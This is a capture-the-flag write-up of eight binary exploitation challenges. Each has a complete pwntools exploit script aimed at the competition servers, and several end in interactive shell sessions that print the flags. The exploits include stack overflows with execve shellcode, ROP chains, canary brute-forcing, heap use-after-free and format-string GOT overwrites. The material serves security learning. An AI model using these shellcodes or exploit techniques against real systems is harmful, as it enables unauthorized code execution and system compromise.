## Dangerous

This is a basic bufferoverflow challenge. Simply overwrite return value with `0x401312`, it's the function that print out the flag.

```python
#!/usr/bin/python3
from pwn import *

p = 0
flag = 0x401312

def main():
    global p
#   p = process('./dangerous')
    p = remote('jh2i.com', 50011)
    payload = 39*b'A'+b'B'*458 + p64(flag)
    p.sendlineafter('?\n', payload)
    p.interactive()

if __name__ == '__main__':
    main()
```

Flag: `flag{legend_of_zelda_overflow_of_time}`

## SaaS

The program let us call any syscall function we want, but some are blacklisted.

List of the functions that are not permitted to call: 

- execve (59)
- fork (57)
- clone (56)
- kill (62)
- ptrace (101)
- tkill (200)

So, what I did is:

- Allocate a memory block with `mmap`.
- `open` `flag.txt`.
- `read` the file, save to the buffer at step 1.
- `write` the content to `stdout`.

```python
#!/usr/bin/python3
from pwn import *

p = 0

def sc(rax,rdi=0,rsi=0,rdx=0,r10=0,r9=0,r8=0,s=''):
    p.sendlineafter('rax (decimal): ', str(rax))
    p.sendlineafter('rdi (decimal): ', str(rdi))
    p.sendlineafter('rsi (decimal): ', str(rsi))
    p.sendlineafter('rdx (decimal): ', str(rdx))
    p.sendlineafter('r10 (decimal): ', str(r10))
    p.sendlineafter('r9 (decimal): ', str(r9))
    p.sendlineafter('r8 (decimal): ', str(r8))
    if rax == 0:
        p.send(s)
    print(p.recvuntil('Rax: 0x').decode())
    r = p.recvline()[:-1].decode()
    return int(r, 16)

def main():
    global p
    #p = process('./saas')
    p = remote('jh2i.com', 50016)
    mem = sc(9, 0, 0x2000, 0x7, 34, 0, -1) # mmap
    print ('[+] Mem: 0x%X' % mem)
    sc(rax=0,rdi=0,rsi=mem,rdx=64,s='flag.txt\x00')
    fd = sc(rax=2,rdi=mem,rsi=0,rdx=0) # open O_RDONLY
    print('[+] fd = %d' % fd)
    sc(rax=0,rdi=fd,rsi=mem,rdx=64)
    print (sc(rax=1,rdi=2,rsi=mem,rdx=64))
    p.interactive()
    
if __name__ == '__main__':
    main()
```

Flag: `flag{rax_rdi_rsi_radical_dude}` 

## Shifts Ahoy

First, I use `checksec`:

```bash
(env3) osboxes@osboxes:~/Desktop/nctf$ checksec shifts-ahoy
[*] '/home/osboxes/Desktop/nctf/shifts-ahoy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

There may be a `rwx` section, so I think the stack is executable. Knowing this, I will try to write a shellcode on the stack, and then do the `jmp rsp` trick.

The `encrypt` function is vulnerable to bufferoverflow.

```c++
int encrypt()
{
  char s[72]; // [rsp+0h] [rbp-50h]
  int i; // [rsp+48h] [rbp-8h]
  int v3; // [rsp+4Ch] [rbp-4h]
    
  printf("Enter the message: ");
  fgets(s, 96, stdin);
  v3 = strlen(s);
  if ( v3 > 64 )
    v3 = 64;
  for ( i = 0; i < v3; ++i )
    s[i] += 13;
  return printf("\nEncrypted Message: %s\n", s);
}
```

There is no `jmp rsp` gadget in the binary. But I found this:

```assembly
.text:00000000004012CD            mov     rsi, rax
.text:00000000004012D0            lea     rdi, aEncryptedMessa ; "\nEncrypted Message: %s\n"
.text:00000000004012D7            mov     eax, 0
.text:00000000004012DC            call    _printf
.text:00000000004012E1            mov     r15, rsp
```

The program assigns the value of `r15` to `rsp` before returning, and there is a `jmp r15` gadget at 0x4011CD

```assembly
.text:00000000004011CD            jmp     r15
```

Everything is ok now, let's write a script:

```python
from pwn import *

p = 0
jmp_r15 = 0x004011cd

def main():
    global p
#   p = process('./shifts-ahoy')
    p = remote('jh2i.com', 50015)
    shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    shellcode = list(map(ord, shellcode))
    for i in range(len(shellcode)):
        shellcode[i] -= 13
        if shellcode[i] < 0:
            shellcode[i] += 256
        shellcode[i] = bytes([shellcode[i]])
#   shellcode = list(map(chr, shellcode))
    shellcode = b''.join(shellcode)
    shellcode = shellcode.ljust(88, b'A') + p64(jmp_r15)
    print (hexdump(shellcode))
    p.sendlineafter('> ', '1')
    p.sendlineafter(b': ', shellcode)
    p.interactive()

if __name__ == '__main__':
    main()
```

```bash
(env3) osboxes@osboxes:~/Desktop/nctf$ python shift.py
[+] Opening connection to jh2i.com on port 50015: Done
00000000  24 b3 3b ae  c4 90 89 84  c3 7f 8a f2  3b ea ce 46  │$·;·│····│····│;··F│
00000010  47 52 8c 45  4a 47 51 a3  2e 02 f8 41  41 41 41 41  │GR·E│JGQ·│.··A│AAAA│
00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000050  41 41 41 41  41 41 41 41  cd 11 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
00000060
[*] Switching to interactive mode

Encrypted Message: 1\xc0H\xbbѝ\x96\x91Ќ\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0fNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNAAAAAAAA@
$ cat flag.txt
flag{captain_of_the_rot13_ship}
```

Flag: `flag{captain_of_the_rot13_ship}`

## Syrup

The program does nothing much, it accepts input from user and then exits. There is a bufferoverflow vulnerbility when user feeds the input to the program, so I use it to make a `ROP chain` to write a shellcode to a `rwx` segment, then jump to it.

```python
from pwn import *

payload = b'A'*(0x400)+p64(0x6042)+b'TRASHCAN'+p64(0x401000)+\
        p64(0x402000)+p64(0x40105D)+p64(0x6042)+p64(0)+p64(0x402000)
p = remote('jh2i.com', 50036)
p.recvuntil('me?\n')
p.send(payload)
sleep(2)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
pause()
p.send(shellcode)
p.interactive()
```

```bash
(env3) osboxes@osboxes:~/Desktop/nctf$ python syrup.py
[+] Opening connection to jh2i.com on port 50036: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
\x00$ ls
flag.txt
syrup
$ cat flag.txt
flag{Sr0ppin_t0_v1ct0Ry}
```

Flag: `flag{Sr0ppin_t0_v1ct0Ry}`

## Conveyor Belt

The program manages a linked list, it let user add a new node to the head of the list. And there is a bufferoverflow vulnerbility that we can use to overwrite the `next` pointer of a chunk, force it to point to somewhere else.

With this, we now get arbitrary read/write.

The `List` structure:

```c
struct List
{
  char buffer[120];
  struct List *next;
};
```

I overwrite `__free_hook` with `system`, then call `free("/bin/sh")`.

```python
from pwn import *

p = 0
free_got = 0x602018
puts_got = 0x602020
libc = ELF('libc.so.6', checksec=False)

def add(name):
	p.sendlineafter('> ', '1')
	p.sendafter('name: ', name)
def start_check():
	p.sendlineafter('> ', '2')
def check(yn,new=b''):
	p.recvline()
	r = p.recvline()[:-1]
	print (hexdump(r))
	p.recvuntil('safe? ')
	p.send(yn+'\x00'+'\n')
	if yn != 'Y' and yn != 'y':
		if new == b'':
			new = r[:6]+b'\x00\x00\n'
		p.sendafter(b'alternative: ', new)
	if len(r) != 6:
		return None
	return u64(r+b'\x00\x00')

def main():
	global p
#	p = process('./conveyor')
	p = remote('jh2i.com', 50020)
	add('xikhud\n')
	add('sh\n')
	start_check()
	check('n', b'A'*120+p64(puts_got))
	puts = check('n')
	base = puts - libc.symbols['puts']
	free_hook = base + libc.symbols['__free_hook']
	system = base + libc.symbols['system']
	log.info('0x%X' % base)
	start_check()
	check('n', b'A'*120+p64(free_hook))
	check('n', p64(system)+b'\n')
	add('/bin/sh\x00\n')

	p.interactive()

if __name__ == '__main__':
	main()
```

```bash
[+] Opening connection to jh2i.com on port 50020: Done
00000000  78 69 6b 68  75 64                                  │xikh│ud│
00000006
00000000  c0 29 c2 b0  30 7f                                  │·)··│0·│
00000006
[*] 0x7F30B0BA2000
00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000070  41 41 41 41  41 41 41 41  20 20 60                  │AAAA│AAAA│  `│
0000007b
00000000
[*] Switching to interactive mode
Ouch! That's part is dangerous. In the interest of safety, we won't add it.
$ cat flag.txt
flag{you_broke_the_conveyor}
```

Flag: `flag{you_broke_the_conveyor}`

## Ripe Reader

The program just listens on port `1234`, waits for connection and spawns a child (with `fork`) to serve the client.

This program is vulnerable to bufferoverflow too !

```c++
  char buf[56]; // [rsp+10h] [rbp-40h]
  unsigned __int64 canary; // [rsp+48h] [rbp-8h]

  canary = __readfsqword(0x28u);
  send(client_sock, "Select one of the images:\n", 0x1AuLL, 0);
  send(client_sock, "[1] @_johnhammond\n", 0x12uLL, 0);
  send(client_sock, "[2] @NahamSec\n", 0xEuLL, 0);
  send(client_sock, "[3] @thecybermentor\n", 0x14uLL, 0);
  send(client_sock, "[4] @stokfredrik\n", 0x11uLL, 0);
  send(client_sock, "[q] QUIT\n", 9uLL, 0);
  recv(client_sock, buf, 1024uLL, 0); // <-------------- what causes BOF
```

Let use `checksec` on this.

```bash
(env3) osboxes@osboxes:~/Desktop/nctf$ checksec ripe_reader
[*] '/home/osboxes/Desktop/nctf/ripe_reader'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`Canary` is found on this binary, so we can't overwrite the return address to make a `rop chain`.

`PIE` is enabled, so we don't know where the binary is located in the memory.

But, what is interesting about `fork` is:

> The child process created by `fork` will inherit stack canary value and memory space of the parrent process.

Knowing this, we will brute-force one-byte each time to get the canary, and the return address on the stack. After that, we can make a `rop chain` like this:

```
- pop_rdi
- socket_fd
- pop_rsi
- &"./flag.txt"
- call printFlag
```

To make the bruteforce process faster, we will need to use `multithread`.

```python
#!/usr/bin/python3
from pwn import *
from sys import argv
import threading
p = 0

success = 0
def brute_thread(ra):
	global success
	for i in ra:
		if success != 0:
			break
		p = remote('eight.jh2i.com', 50023)
		p.recvuntil('QUIT\n')
		payload = b'A'*56+b'\x00\x73\x01\xAE\x3D\x63\x31\x50'+\
					b'\xA0\x02\xB3\xED\xFD\x7F\x00\x00'+\
					b'\xC4\x8D\xB7\x1F\x7E\x55'+bytes([i])
		p.send(payload)
		try:
			l = len(p.recvuntil('QUIT\n',timeout=1))
			if l > 0:
				log.info('Success, i = 0x%X' % i)
				success = 1
				break
			p.close()
		except:
			p.close()

def brute():
	n = 32
	each = 256//n
	thread_list = []
	for i in range(n):
		th = threading.Thread(target=brute_thread,\
							  args=(range(each*i,each*i+each),))
		thread_list.append(th)
	for i in thread_list:
		i.start()
	for i in thread_list:
		i.join()

def main():
	global p
	pop_rdi = 0x1103
	pop_rsi_r15 = 0x1101
	p = remote('eight.jh2i.com', 50023)
	r = b'\xC4\x8D\xB7\x1F\x7E\x55\x00\x00'
	r = u64(r)
	b_base = r - 0xDC4

	pop_rdi += b_base
	pop_rsi_r15 += b_base

	log.info('b_base: 0x%X' % b_base)
	payload = b'A'*56+b'\x00\x73\x01\xAE\x3D\x63\x31\x50'+\
			b'\xA0\x02\xB3\xED\xFD\x7F\x00\x00'+\
			p64(pop_rdi) + p64(4) +\
			p64(pop_rsi_r15) + p64(b_base+0x1128) + p64(0) +\
			p64(b_base+0xFDC)
	p.sendafter(b'QUIT\n', payload)
	p.interactive()

if __name__ == '__main__':
	main()
#	brute_thread([0])
	#brute()
```

Flag: `flag{should_make_an_ascii_flag_image}`

## Free Willy

This program is vulnerable to both `double free` and `use after free` !

```c++
unsigned __int64 __fastcall disown_whale(Whale **a1, unsigned __int64 total)
{
  unsigned __int64 result; // rax
  int v3; // [rsp+1Ch] [rbp-34h]
  unsigned __int64 i; // [rsp+20h] [rbp-30h]
  char *ptr; // [rsp+28h] [rbp-28h]
  char s; // [rsp+30h] [rbp-20h]
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("We're sorry it didn't work out.");
  puts("Which whale would you like to send away?");
  for ( i = 0LL; i < total; ++i )
  {
    printf("%d. %s", i, a1[i]->name);
  }
  fgets(&s, 16, stdin);
  v3 = atoi(&s);
  if ( v3 >= 0 && total > v3 )
  {
    ptr = a1[v3]->name;
    free(a1[v3]);
    free(ptr);
    result = total;
  }
  else
  {
    puts("You don't even know your own children!?");
    result = total;
  }
  return result;
}
```

After some reversing, I found the `Whale` structure:

```c++
struct Whale
{
  char pad[8];
  char *name;
  unsigned __int64 size;
  int shape;
}; // sizeof after padding = 32
```

Basically, what I do is:

- `disown` a `Whale`.
- Use `UAF` to overwrite `fd` of the first `tcache` entry with its address.
- `adopt` a new `Whale` , this `Whale` will have the `name` pointer points to itself.
- `rename` this `Whale` to overwrite its `name` ptr with an entry in `GOT` table.
- Leak libc base address.
- Overwrite `free` with `system`.
- Find a way to call `free("/bin/sh")`.

```python
from pwn import *
#context.log_level = 'debug'
p = 0
atoi_got = 0x603060
libc = ELF('libc-2.27.so', checksec=False)
def adopt(name):
	p.sendlineafter('> ', 'adopt')
	p.sendafter(b'whale?\n', name)

def observe(idx):
	p.sendlineafter('> ', 'observe')
	p.recvuntil('observe?\n')
	p.sendlineafter('observe?\n', str(idx))
	p.recvuntil('lil ')
	return p.recvline()[:-1]

def disown(idx):
	p.sendlineafter('> ', 'disown')
	p.recvuntil('send away?\n')
	sleep(1)
	p.sendline(str(idx))

def rename(idx, name):
	p.sendlineafter('> ', 'name')
	sleep(1)
	p.sendline(str(idx))
	p.sendafter(b'name?\n', name)


def main():
	global p
#	p = process('./free-willy')
	p = remote('jh2i.com', 50021)
	adopt(b'xikhud\n')
	disown(0)
	r = observe(0).ljust(8, b'\x00')
	heap = u64(r) - 0x10
	log.info('Heap: 0x%X' % heap)
	rename(0, p64(heap+0x30+0x10)+b'\n')
	adopt(b'/bin/sh\x00' + p64(0x603018) + p8(32) + b'\n')
	r = observe(1).ljust(8, b'\x00')
	free = u64(r)
	log.info('free: 0x%X' % free)
	base = free - libc.symbols['free']
	system = base + libc.symbols['system']
	binsh  = base + next(libc.search(b'/bin/sh\x00'))
	puts = base + libc.symbols['puts']
	log.info('binsh: 0x%X' % binsh)
	log.info('base: 0x%X' % base)
	log.info('system: 0x%X' % system)
	log.info(b'system: %s' % p64(system))
	rename(1, p64(system)+p64(puts)+b'\n')
	disown(0)
	p.interactive()

if __name__ == '__main__':
	main()
```

```bash
(env3) osboxes@osboxes:~/Desktop/nctf$ python free-willy.py
[+] Opening connection to jh2i.com on port 50021: Done
[*] Heap: 0x1974260
[*] free: 0x7F184E227950
[*] binsh: 0x7F184E343E9A
[*] base: 0x7F184E190000
[*] system: 0x7F184E1DF440
[*] b'system: @\xf4\x1dN\x18\x7f\x00\x00'
[*] Switching to interactive mode
0. /bin/sh1. @\xf4N\xls
flag.txt
free-willy
$ cat flag.txt
flag{always_release_willy_after_freeing}
```

Flag: `flag{always_release_willy_after_freeing}`

## Leet Haxor

The program is simple, it encodes (or decodes) the user input, and prints it.

```c++
int __fastcall l33tify(const char *a1)
{
  int i; // [rsp+1Ch] [rbp-14h]

  for ( i = 0; i <= strlen(a1); ++i )
  {
    switch ( a1[i] )
    {
      case 'A':
      case 'a':
        a1[i] = '4';
        break;
      case 'B':
      case 'b':
        a1[i] = '8';
        break;
      case 'E':
      case 'e':
        a1[i] = '3';
        break;
      case 'G':
      case 'g':
        a1[i] = '6';
        break;
      case 'I':
      case 'i':
        a1[i] = '1';
        break;
      case 'O':
      case 'o':
        a1[i] = '0';
        break;
      case 'S':
      case 's':
        a1[i] = '5';
        break;
      case 'T':
      case 't':
        a1[i] = '7';
        break;
      case 'Z':
      case 'z':
        a1[i] = '2';
        break;
      default:
        continue;
    }
  }
  return printf(a1);
}
```

Yes it is vulnerable to `Format string vulnerbility`. What I did is:

- Read the stack to leak `__libc_start_main`.
- Leak libc base address.
- In `GOT table`, overwrite `strlen` with `system`.
- Call `strlen("/bin/sh")`.

Script:

```python
from pwn import *
p = 0
libc = ELF('libc.so.6', checksec=False)
strlen_got = 0x601020
_main = 0x400995
fini = 0x600E18

def leet(s, ret=True):
	p.sendlineafter('exit\n', '0')
	if isinstance(s, str):
		p.sendafter('):\n', s)
	elif isinstance(s, bytes):
		p.sendafter(b'):\n', s)
	else:
		assert (False)
	if ret:
		return p.recvline()

def main():
	global p
	#p = process('./leet_haxor')
	p = remote('jh2i.com', 50022)
	r = leet('%33$llx' + '\n')[:-1]
	libc_start_main = int(r, 16) - 0xE7
	base = libc_start_main - libc.symbols['__libc_start_main']
	system = base + libc.symbols['system']
	strlen = base + libc.symbols['strlen']
	log.info('system   : 0x%X' % system)
	log.info('strlen   : 0x%X' % strlen)
	log.info('libc_base: 0x%X' % base)
	lo = system & 0xFFFF
	hi = (system >> 16) & 0xFFFF
	log.info('lo: %d, hi: %d' % (lo,hi))
	if lo < hi:
		payload = b'%0'+str(lo).encode()+b'X'
		payload += b'%YY$hn'
		payload += b'%0'+str(hi-lo).encode()+b'X'
		payload += b'%ZZ$hn'
		while (len(payload) - 2) % 8 != 0:
			payload += b'Q'
		next = (len(payload)) // 8
		payload += p64(strlen_got) + p64(strlen_got+2) + b'\n'
		payload = payload.replace(b'YY', str(18+next).encode())
		payload = payload.replace(b'ZZ', str(19+next).encode())
		print (hexdump(payload))

	else:
		payload = b'%0'+str(hi).encode()+b'X'
		payload += b'%YY$hn'
		payload += b'%0'+str(lo-hi).encode()+b'X'
		payload += b'%ZZ$hn'
		while (len(payload)) % 8 != 0:
			payload += b'Q'
		next = (len(payload)) // 8
		payload += p64(strlen_got+2) + p64(strlen_got) + b'\n'
		payload = payload.replace(b'YY', str(18+next).encode())
		payload = payload.replace(b'ZZ', str(19+next).encode())
		print (hexdump(payload))
	leet(payload, False)
	p.sendline('0')
	p.sendlineafter(b'):\n', '/bin/sh\x00')
	p.interactive()

if __name__ == '__main__':
	main()
```

```bash
(env3) osboxes@osboxes:~/Desktop/nctf$ python leet_haxor.py
[+] Opening connection to jh2i.com on port 50022: Done
[*] system   : 0x7F273089F440
[*] strlen   : 0x7F27308EDC70
[*] libc_base: 0x7F2730850000
[*] lo: 62528, hi: 12425
00000000  25 30 31 32  34 32 35 58  25 32 32 24  68 6e 25 30  │%012│425X│%22$│hn%0│
00000010  35 30 31 30  33 58 25 32  33 24 68 6e  51 51 51 51  │5010│3X%2│3$hn│QQQQ│
00000020  22 10 60 00  00 00 00 00  20 10 60 00  00 00 00 00  │"·`·│····│ ·`·│····│
00000030  0a                                                  │·│
00000031
[*] Switching to interactive mode
$ ls
bin  bin.c  flag.txt
$ cat flag.txt
flag{w0w_y0u_4r3_4_l33t_h@x0r}
```

Flag: `flag{w0w_y0u_4r3_4_l33t_h@x0r}`